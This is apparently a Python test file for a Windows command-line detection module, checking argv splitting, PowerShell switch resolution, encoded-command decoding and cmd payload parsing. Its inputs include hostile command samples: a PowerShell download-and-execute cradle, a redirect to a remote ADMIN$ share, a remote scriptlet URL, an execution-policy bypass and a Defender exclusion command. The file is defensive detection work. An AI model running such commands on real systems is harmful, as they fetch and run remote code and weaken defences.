"""The Windows command-line tokenizer against adversarial quoting, cmd payloads, and PowerShell switches."""

from __future__ import annotations

import base64

from romulus.detect.windows_cmdline import (
    cmd_payload,
    is_user_writable,
    parse_cmd_payload,
    parse_powershell,
    ps_parameter_matches,
    ps_tokens,
    resolve_ps_switch,
    split_argv,
    switch_value,
    url_in,
)


def test_split_argv_follows_commandlinetoargvw_backslash_and_quote_rules():
    # 2n backslashes before a quote -> n backslashes, quote toggles; 2n+1 -> n backslashes + literal quote.
    # (the first argument is the program name and takes no escapes, so these use a leading program name)
    assert split_argv(r'program "a b" c') == ["program", "a b", "c"]
    assert split_argv(r'prog a\\\\"b c" d') == ["prog", "a\\\\b c", "d"]
    assert split_argv(r'prog a\\\"b c') == ["prog", 'a\\"b', "c"]
    assert split_argv(r'prog "a\"b" c') == ["prog", 'a"b', "c"]
    # a doubled quote inside a quoted span is a literal quote
    assert split_argv('prog "a""b" c') == ["prog", 'a"b', "c"]
    # the program name takes no escapes and ends at its closing quote
    assert split_argv(r'"C:\Program Files\x.exe" -flag') == [r"C:\Program Files\x.exe", "-flag"]
    assert split_argv("") == []
    assert split_argv("   ") == []


def test_switch_prefixes_do_not_collide():
    # -nop is NoProfile, not NoExit; grouped and unicode-dash forms resolve the same way
    assert resolve_ps_switch("-nop") == "noprofile"
    assert resolve_ps_switch("-noe") == "noexit"
    assert resolve_ps_switch("-noni") == "noninteractive"
    assert resolve_ps_switch("-nol") == "nologo"
    assert resolve_ps_switch("-e") == "encodedcommand"
    assert resolve_ps_switch("-en") == "encodedcommand"
    assert resolve_ps_switch("-enc") == "encodedcommand"
    assert resolve_ps_switch("-EncodedCommand") == "encodedcommand"
    assert resolve_ps_switch("-ex") == "executionpolicy"
    assert resolve_ps_switch("/c") == "command"
    assert resolve_ps_switch("\u2013enc") == "encodedcommand"       # en dash
    assert resolve_ps_switch("\u2014Command") == "command"          # em dash
    assert resolve_ps_switch("notaswitch") is None


def test_powershell_encoded_command_is_decoded_from_utf16le_base64():
    script = "IEX (New-Object Net.WebClient).DownloadString('http://x/y')"
    encoded = base64.b64encode(script.encode("utf-16-le")).decode()
    call = parse_powershell(["-NoProfile", "-EncodedCommand", encoded])
    assert call.source == "encodedcommand"
    assert call.script == script
    assert call.switches["noprofile"] is True


def test_powershell_bad_encoded_command_is_reported_not_guessed():
    call = parse_powershell(["-enc", "not-base64!!!"])
    assert call.source == "encodedcommand"
    assert call.script is None and "Base64" in call.decode_error


def test_powershell_command_rest_captures_the_remaining_tokens():
    call = parse_powershell(["-NoProfile", "-Command", "Get-Date", ";", "whoami"])
    assert call.source == "command" and call.script == "Get-Date ; whoami"


def test_cmd_payload_detects_grouped_and_quoted_switches():
    assert cmd_payload("cmd.exe /c whoami") == "whoami"
    assert cmd_payload("cmd.exe /q /c echo hi") == "echo hi"
    assert cmd_payload('"C:\\Windows\\System32\\cmd.exe" /c dir') == "dir"
    assert cmd_payload("cmd /k start") == "start"
    assert cmd_payload("cmd.exe /v:on") is None          # no run switch


def test_cmd_payload_caret_escapes_and_redirection_to_unc():
    commands = parse_cmd_payload("who^ami > \\\\10.0.0.1\\ADMIN$\\out.txt")
    assert len(commands) == 1
    assert commands[0].argv == ["whoami"]
    assert commands[0].redirects == [(">", "\\\\10.0.0.1\\ADMIN$\\out.txt")]


def test_cmd_payload_separators_do_not_split_inside_quotes():
    commands = parse_cmd_payload('echo "a & b" & whoami')
    assert [c.argv for c in commands] == [["echo", "a & b"], ["whoami"]]


def test_switch_value_reads_inline_values():
    assert switch_value("/i:http://x/y.sct") == "http://x/y.sct"
    assert switch_value("-ep=bypass") == "bypass"
    assert switch_value("/s") is None


def test_url_in_finds_a_url_even_behind_a_switch_prefix():
    assert url_in("http://example.test/a") == "http://example.test/a"
    assert url_in("/i:https://example.test/x.sct") == "https://example.test/x.sct"
    assert url_in("C:\\local\\file.dll") is None


def test_ps_tokens_keep_string_and_comment_contents_out_of_code_words():
    tokens = ps_tokens("# Invoke-WebRequest in a comment\n$x = 'DownloadString only in a string'; Get-Date")
    words = {t.text for t in tokens if t.kind == "word"}
    members = {t.text for t in tokens if t.kind == "member"}
    strings = {t.text for t in tokens if t.kind == "string"}
    assert "get-date" in words
    assert "invoke-webrequest" not in words        # it was only in a comment
    assert "downloadstring" not in members         # it was only in a string
    assert any("downloadstring" in s for s in strings)


def test_ps_tokens_recognise_a_member_call_after_a_value():
    tokens = ps_tokens("(New-Object Net.WebClient).DownloadString('http://x')")
    assert any(t.kind == "member" and t.text == "downloadstring" for t in tokens)
    assert any(t.kind == "word" and t.text == "new-object" for t in tokens)


def test_ps_parameter_matches_uses_cmdlet_prefix_rules():
    [param] = [t for t in ps_tokens("Set-MpPreference -ExclusionPath C:\\x") if t.kind == "parameter"]
    assert ps_parameter_matches(param, "exclusionpath", "exclusionp")
    assert not ps_parameter_matches(param, "exclusionprocess", "exclusionpr")


def test_user_writable_paths_include_unexpanded_variables_and_exclude_unc():
    assert is_user_writable(r"C:\Users\bob\AppData\Local\Temp\x.vbs")
    assert is_user_writable("%TEMP%\\x.js")
    assert is_user_writable("$env:APPDATA\\x.ps1")
    assert not is_user_writable(r"C:\Windows\System32\x.vbs")
    assert not is_user_writable(r"\\server\share\x.vbs")       # a remote path is not "user-writable" here
